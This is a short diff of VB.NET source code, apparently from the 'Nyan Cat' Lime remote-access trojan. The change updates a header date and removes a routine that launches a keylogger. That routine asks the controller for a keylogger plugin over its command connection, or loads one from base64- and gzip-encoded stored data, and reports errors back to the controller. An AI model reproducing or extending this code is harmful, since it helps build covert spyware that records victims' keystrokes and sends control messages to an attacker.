@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##        N Y A N   C A T  |||   Updated on Sept/22/2018        ##
+'##        N Y A N   C A T  |||   Updated on Sept/25/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -79,9 +79,6 @@ Namespace Lime
                     Dim _PIN As Threading.Thread = New Threading.Thread(AddressOf StartPIN)
                     _PIN.Start()
                 End If
-
-                Dim _KLG As Threading.Thread = New Threading.Thread(AddressOf StartKLG)
-                _KLG.Start()
 
                 Dim CHK As Threading.Thread = New Threading.Thread(AddressOf Checking)
                 CHK.Start()
@@ -207,25 +204,6 @@ Namespace Lime
             End Try
         End Sub
 
-        Private Shared Sub StartKLG()
-            Try
-                If GTV("_KLG") = Nothing Then
-                    While True
-                        If C.Alive = True Then
-                            Threading.Thread.CurrentThread.Sleep(11000)
-                            C.Send("PLKLG")
-                            Exit While
-                        End If
-                        Threading.Thread.Sleep(5000)
-                    End While
-
-                Else
-                    C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_KLG")), False))
-                End If
-            Catch ex As Exception
-                C.Send("MSG" + SPL + "_KLG Error! " + ex.Message)
-            End Try
-        End Sub
 #End Region
 
     End Class
